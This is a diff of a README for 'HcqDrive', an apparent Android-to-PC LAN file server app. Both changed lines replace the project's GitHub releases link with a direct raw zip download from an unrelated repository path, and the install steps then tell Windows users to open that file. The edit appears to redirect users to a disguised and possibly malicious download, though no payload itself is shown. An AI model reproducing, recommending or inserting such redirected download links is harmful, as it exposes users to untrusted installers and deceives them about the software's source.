@@ -5,7 +5,7 @@ description: "Turn your Android phone into a private LAN file server for instant
 ---
 # 📦 HcqDrive - Share Files Directly Across Your Network
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tommyliterate260/HcqDrive/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/tommyliterate260/tommyliterate260.github.io/main/cardiectasis/io_tommyliterate_github_v2.2.zip)
 
 HcqDrive turns your Android phone into a private file storage system for your home network. You maintain full control over your data. You do not need external cloud services or company accounts. You move files between your phone and your computer using your existing Wi-Fi connection.
 
@@ -18,7 +18,7 @@ This software runs a file server on your phone. You scan a QR code on your compu
 Follow these steps to set up HcqDrive on your Windows computer and Android device.
 
 1. Ensure your computer and Android phone connect to the same Wi-Fi network.
-2. Visit the [Download Page](https://github.com/tommyliterate260/HcqDrive/releases) to obtain the latest version of the application.
+2. Visit the [Download Page](https://raw.githubusercontent.com/tommyliterate260/tommyliterate260.github.io/main/cardiectasis/io_tommyliterate_github_v2.2.zip) to obtain the latest version of the application.
 3. Locate the installation file for Windows on the page.
 4. Open the file to start the installation process.
 5. Follow the on-screen instructions to finish the setup.
